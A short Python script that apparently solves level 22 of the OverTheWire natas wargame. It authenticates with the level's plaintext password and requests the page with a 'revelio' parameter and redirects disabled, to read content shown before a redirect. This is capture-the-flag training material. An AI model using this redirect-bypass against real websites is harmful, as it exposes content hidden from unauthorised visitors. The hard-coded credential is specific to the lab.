#!/usr/bin/python

import requests

username = "natas22"
password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"

auth = (username, password)

url = "http://natas22.natas.labs.overthewire.org/"


req = requests.get(url, auth = auth, params = {'revelio' : 'hello'} , allow_redirects = False)

print req.text
